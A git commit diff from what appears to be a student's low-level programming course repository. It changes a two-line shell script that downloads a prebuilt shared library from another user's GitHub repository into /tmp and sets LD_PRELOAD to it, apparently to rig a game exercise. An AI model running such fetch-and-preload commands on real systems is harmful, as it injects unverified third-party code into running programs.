9c7ebd1b25e859aff4fab1558afcfc89e84d6377
TY-Of-Codes <105139294+TY-Of-Codes@users.noreply.github.com>
2022-09-05 19:14:58 +0100

    new commit

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/biruk-tadesse/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libmask.so
-export LD_PRELOAD=/tmp/libmask.so
+wget -P /tmp/ https://raw.github.com/david-develop/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/libran.so
+export LD_PRELOAD=/tmp/libran.so
